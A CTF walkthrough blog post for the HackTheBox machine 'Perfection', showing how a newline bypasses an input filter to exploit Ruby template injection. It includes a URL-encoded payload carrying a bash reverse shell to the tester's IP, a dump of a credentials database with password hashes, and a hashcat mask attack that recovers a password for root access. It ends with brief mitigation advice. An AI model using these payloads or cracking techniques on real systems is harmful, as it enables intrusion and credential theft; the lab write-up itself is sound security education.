---
title: "HackTheBox - Perfection"
author: Nasrallah
description: ""
date: 2024-07-07 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, ssti, hashcat, crack]
img_path: /assets/img/hackthebox/machines/perfection
image:
    path: perfection.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

## **Description:**

[Perfection](https://www.hackthebox.com/machines/perfection) from [HackTheBox](https://affiliate.hackthebox.com/nasrallahbaadi). The machine has a website for calculating weighted grades. There is a filter for malicious input but it can be bypassed with a new line to exploit a SSTI and get a shell. After that we find a mail that reveals a password convention used and a password hash, we use a hashcat rule and crack the hash to get root.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.253
Host is up (0.076s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two open ports, 22 running openSSH and 80 is Nginx http web server.

### Web

Let's check the web page.

![webpage](1.png)

this is "a tool to calculate the total grade in a class based on category scores and percentage weights.".

Checking `Wappalyzer` we see that the web application is using `ruby`.

![wappalyzer](5.png)

Let's check the calculator.

![calc](2.png)

There is a table we need to fill, let's do it.

![table](3.png)

We submitted our input and it got calculated.

Let's see how it looks on Burp Suite.

![burpsuite](4.png)

Just a normal post request as expected.

#### SSTI

Since the application is using `ruby`, I was thinking it might be vulnerable to an SSTI (Server Side Template Injection).

I went to [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby) and started trying different payloads.

![sstitest](6.png)

I used the payload `<%= 7 * 7 %>` but I got an invalid encoding error.

I tried again but this time I URL encoded the payload `<%25%3d+7+*+7+%25>`

![sstiurlencoded](7.png)

I didn't get the error this time, but we get `Malicious input blocked`, which means there is a filter.

#### SSTI/CRLF

I found this post <https://medium.com/@thewhitehatpanther/ssti-bypass-using-crlf-1337-up-ctf-smarty-pants-4ee8e1a72f98> talking about how to bypass SSTI using CRLF(Carriage Return, Line Feed).

The technique here is to add a new line `%0A` before or after the payload.

Let's try it using the payload `a%0A<%25%3d+7+*+7+%25>`

- a: is the name of the grade.
- %0A : is new line
- `<%25%3d+7+*+7+%25>` : SSTI payload that should results in 49 if it worked.

![workedssti](8.png)

It worked!

## **Foothold**

Now let's get our foothold.

Let's try a different payload, a command execution one. ``<%= `ls /` %>``

![lscommand](9.png)

We got command execution, now let's get a reverse shell, the command I'll be using is:

```bash
bash -c "/bin/bash -i >& /dev/tcp/10.10.14.226/9001 0>&1"
```

I'll add it to the payload.

```ruby
a%0A<%= `bash -c "/bin/bash -i >& /dev/tcp/10.10.14.226/9001 0>&1"` %>
```

Then I'll url encode everything.

> CTRL + u in burp does the job.

```ruby
a%0A<%25%3d+`bash+-c+"/bin/bash+-i+>%26+/dev/tcp/10.10.14.226/9001+0>%261"`+%25>
```

![revshell](10.png)

## **Privilege Escalation**

### Susan --> root

When running `id` we find that susan is part of the sudoers.

```bash
susan@perfection:/tmp$ id
uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
```

We don't have susan's password so let's do some enumeration.

Let's run linpeas.

![mail](11.png)

We find that susan has some mail. Let's read it.

```text
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

This revealed the password format used. So for susan it would be `susan_nasus_xxxxxxxxx`

Linpeas also revealed a db file in susan home directory.

![db](12.png)

```bash
susan@perfection:~/Migration$ sqlite3 pupilpath_credentials.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
);
INSERT INTO users VALUES(1,'Susan Miller','abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f');
INSERT INTO users VALUES(2,'Tina Smith','dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57');
INSERT INTO users VALUES(3,'Harry Tyler','d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393');
INSERT INTO users VALUES(4,'David Lawrence','ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a');
INSERT INTO users VALUES(5,'Stephen Locke','154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8');
COMMIT;
```

I dumped the whole database with `.dump` and we find some password hashes.

Let's take susan's hash and crack it.

#### Hashcat

We know the password format used here so we don't need a password list.

We can use hashcat to do the job for us.

![hashcat](13.png)

We will use attack mode 3 which is brute force and the `?d` charset that would loop numbers from 0-9.

```terminal
$ hashcat -m 1400 crack.hash -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d


hashcat (v6.2.6) starting

Host memory required for this attack: 1475 MB

abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: crack.hash
Time.Started.....: Fri Apr 26 10:30:04 2024 (34 secs)
Time.Estimated...: Fri Apr 26 10:30:38 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: susan_nasus_?d?d?d?d?d?d?d?d?d [21]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 28980.5 kH/s (5.46ms) @ Accel:512 Loops:1 Thr:32 Vec:1
Recovered........: 1/5 (20.00%) Digests (total), 1/5 (20.00%) Digests (new)
Progress.........: 1000000000/1000000000 (100.00%)
Rejected.........: 0/1000000000 (0.00%)
Restore.Point....: 1000000000/1000000000 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: susan_nasus_105537373 -> susan_nasus_737484646
```

We got the password, now let's check our privileges.

```terminal
susan@perfection:~$ sudo -l
[sudo] password for susan: 
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL
```

We can get root easily by running `sudo su`

```terminal
susan@perfection:~$ sudo su
root@perfection:/home/susan# id
uid=0(root) gid=0(root) groups=0(root)
root@perfection:/home/susan# 
```

## **Prevention and Mitigation**

### SSTI vulnerability

Server Side Template Injection is a severe vulnerability that allows for file read and even remote command execution.

To prevent such vulnerability, user input should always be sanitized before passing it to the templates, this is done by removing unwanted and risky characters.

Another thing is to use a `Sandbox`, so in case of an exploit, the attacker would be very limited from any malicious activities.

### Passwords

The password format was very strong, but it was revealed to us from the email. Email containing sensitive information should be encrypted and deleted after they're opened.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

## Resources

<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby>

<https://medium.com/@thewhitehatpanther/ssti-bypass-using-crlf-1337-up-ctf-smarty-pants-4ee8e1a72f98>
